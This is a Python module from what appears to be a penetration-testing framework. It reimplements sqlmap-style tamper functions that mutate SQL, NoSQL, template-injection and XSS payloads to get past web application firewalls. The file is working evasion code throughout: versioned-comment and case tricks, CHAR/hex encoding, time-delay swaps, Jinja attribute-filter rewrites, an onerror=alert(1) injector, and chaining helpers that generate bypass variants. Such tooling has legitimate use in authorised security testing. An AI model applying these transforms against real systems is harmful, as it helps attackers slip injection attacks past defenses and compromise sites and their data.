"""
core/loops/injection_tamper.py — 可组合注入绕过原语库（§2.7 / 技术方案 3.12.1）。

## 对标
sqlmap 的 85 个 tamper 是**纯函数**：输入 payload → 输出绕过变体，
WAF 绕过 = 多个 tamper 串联（`--tamper=a,b,c`）。本模块按同样范式用 stdlib 重写。

## 玄鉴现状（grep 核验）
`core/loops/waf_bypass_primitives.yaml` 只有 **23 条静态字符串**（非可组合），
`core/loops/` 下原本没有本模块。

## 零依赖红线
不 pip install sqlmap/XSStrike，只借范式 stdlib 重实现。
"""
from __future__ import annotations

import random
import re
from typing import Callable

# ----------------------------- sqli 原语（14） -----------------------------


def space2comment(p: str) -> str:
    return p.replace(" ", "/**/")


def random_comments(p: str) -> str:
    out = []
    for ch in p:
        out.append(ch)
        if ch == " ":
            out.append("/**/")
    return "".join(out)


def versioned_comment(p: str) -> str:
    return re.sub(r"\b(UNION|SELECT)\b", r"/*!50000\1*/", p, flags=re.I)


def versioned_comment_zero(p: str) -> str:
    return re.sub(r"\b(UNION|SELECT)\b", r"/*!00000\1*/", p, flags=re.I)


def inline_keyword_comment(p: str) -> str:
    return re.sub(r"\b(OR|AND)\b", lambda m: m.group(1)[0] + "/**/" + m.group(1)[1:],
                  p, flags=re.I)


def random_case(p: str) -> str:
    return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in p)


def equal_to_like(p: str) -> str:
    return p.replace("=", " LIKE ")


def comma_to_join(p: str) -> str:
    if re.search(r"UNION\s+SELECT", p, flags=re.I):
        return re.sub(r"\bUNION\s+SELECT\s+(.+)",
                      lambda m: "UNION SELECT * FROM (SELECT "
                      + m.group(1).replace(",", ")a JOIN (SELECT "),
                      p, flags=re.I)
    return p


def char_construct(p: str) -> str:
    return re.sub(r"'([A-Za-z]+)'",
                  lambda m: "CHAR(" + ",".join(str(ord(c)) for c in m.group(1)) + ")",
                  p)


def hex_construct(p: str) -> str:
    return re.sub(r"'([A-Za-z0-9_]+)'",
                  lambda m: "0x" + m.group(1).encode().hex(), p)


def sleep_to_benchmark(p: str) -> str:
    return re.sub(r"SLEEP\((\d+)\)", r"BENCHMARK(10000000,MD5('x'))", p, flags=re.I)


def sleep_to_pgsleep(p: str) -> str:
    return re.sub(r"SLEEP\((\d+)\)", r"PG_SLEEP(\1)", p, flags=re.I)


def plus_to_concat(p: str) -> str:
    return p.replace("+", " || ")


def info_schema_comment(p: str) -> str:
    return p.replace("information_schema", "information_schema/*!*/")


# ----------------------------- nosql 原语（4） -----------------------------


def nosql_op_urlencode(p: str) -> str:
    return p.replace("$", "%24")


def nosql_op_double_urlencode(p: str) -> str:
    return p.replace("$", "%2524")


def nosql_struct_wrap(p: str) -> str:
    return p.replace("{", '{"$comment":"x",')


def nosql_json_to_form(p: str) -> str:
    p = p.replace('"', "").replace("{", "").replace("}", "").replace(":", "=")
    return p.replace(" ", "")


# ------------------------------ ssti 原语（5） -----------------------------


def ssti_str_concat(p: str) -> str:
    return p.replace("__class__", "['__cl' + 'ass__']")


def ssti_attr_filter(p: str) -> str:
    return re.sub(r"\.(\w+)", r"|attr('\1')", p)


def ssti_hex_attr(p: str) -> str:
    return re.sub(r"(\w+)",
                  lambda m: "\\x" + "\\x".join(f"{ord(c):02x}" for c in m.group(1)),
                  p)


def ssti_brace_split(p: str) -> str:
    return p.replace("{{", "{ {").replace("}}", "} }")


def ssti_request_global(p: str) -> str:
    return p.replace("''.__class__", "request.application.__globals__")


# ------------------------------- xss 原语（5） -----------------------------


def xss_quote_variant(p: str) -> str:
    return p.replace('"', "'").replace("'", "&#x27;")


def xss_tag_mutation(p: str) -> str:
    return p.replace("<script", "<svg").replace("</script>", "</svg>")


def xss_event_handler(p: str) -> str:
    if "onerror" not in p:
        return p.replace("<img", "<img onerror=alert(1)")
    return p


def xss_js_encode(p: str) -> str:
    return "".join(f"\\x{ord(c):02x}" for c in p)


def xss_double_encode(p: str) -> str:
    return p.replace("<", "%253C").replace(">", "%253E")


PRIMITIVES: dict[str, dict[str, Callable[[str], str]]] = {
    "sqli": {
        "space2comment": space2comment,
        "random_comments": random_comments,
        "versioned_comment": versioned_comment,
        "versioned_comment_zero": versioned_comment_zero,
        "inline_keyword_comment": inline_keyword_comment,
        "random_case": random_case,
        "equal_to_like": equal_to_like,
        "comma_to_join": comma_to_join,
        "char_construct": char_construct,
        "hex_construct": hex_construct,
        "sleep_to_benchmark": sleep_to_benchmark,
        "sleep_to_pgsleep": sleep_to_pgsleep,
        "plus_to_concat": plus_to_concat,
        "info_schema_comment": info_schema_comment,
    },
    "nosql": {
        "nosql_op_urlencode": nosql_op_urlencode,
        "nosql_op_double_urlencode": nosql_op_double_urlencode,
        "nosql_struct_wrap": nosql_struct_wrap,
        "nosql_json_to_form": nosql_json_to_form,
    },
    "ssti": {
        "ssti_str_concat": ssti_str_concat,
        "ssti_attr_filter": ssti_attr_filter,
        "ssti_hex_attr": ssti_hex_attr,
        "ssti_brace_split": ssti_brace_split,
        "ssti_request_global": ssti_request_global,
    },
    "xss": {
        "xss_quote_variant": xss_quote_variant,
        "xss_tag_mutation": xss_tag_mutation,
        "xss_event_handler": xss_event_handler,
        "xss_js_encode": xss_js_encode,
        "xss_double_encode": xss_double_encode,
    },
}

CURATED_CHAINS: dict[str, list[str]] = {
    "sqli": ["space2comment", "random_case"],
    "nosql": ["nosql_op_urlencode"],
    "ssti": ["ssti_str_concat", "ssti_attr_filter"],
    "xss": ["xss_tag_mutation", "xss_double_encode"],
}


def primitive_count() -> int:
    return sum(len(v) for v in PRIMITIVES.values())


def tamper(payload: str, name: str) -> str:
    """应用单个原语（按名字在四类中查找）。找不到原样返回。"""
    for cls in PRIMITIVES.values():
        fn = cls.get(name)
        if fn is not None:
            return fn(payload)
    return payload


def tamper_chain(payload: str, names: list[str]) -> str:
    """按顺序串联多个原语（对应 sqlmap `--tamper=a,b,c`）。"""
    out = payload
    for n in names or []:
        out = tamper(out, n)
    return out


def generate_variants(payload: str, cls: str, limit: int = 12) -> list[str]:
    """为某类注入生成绕过变体：先单原语，再叠加策展链。"""
    primitives = PRIMITIVES.get(cls, {})
    variants: list[str] = []

    for fn in primitives.values():
        try:
            v = fn(payload)
        except Exception:
            continue
        if v != payload and v not in variants:
            variants.append(v)

    # 策展链内的单原语
    for name in CURATED_CHAINS.get(cls, []):
        try:
            v = tamper(payload, name)
        except Exception:
            continue
        if v != payload and v not in variants:
            variants.append(v)

    # 策展链整体串联（对应 sqlmap --tamper=a,b,c）：产生单原语之外的组合变体
    chain = CURATED_CHAINS.get(cls) or []
    if len(chain) > 1:
        try:
            v = tamper_chain(payload, chain)
        except Exception:
            v = payload
        if v != payload and v not in variants:
            variants.append(v)

    return variants[:limit]


__all__ = [
    "PRIMITIVES",
    "CURATED_CHAINS",
    "tamper",
    "tamper_chain",
    "generate_variants",
    "primitive_count",
]
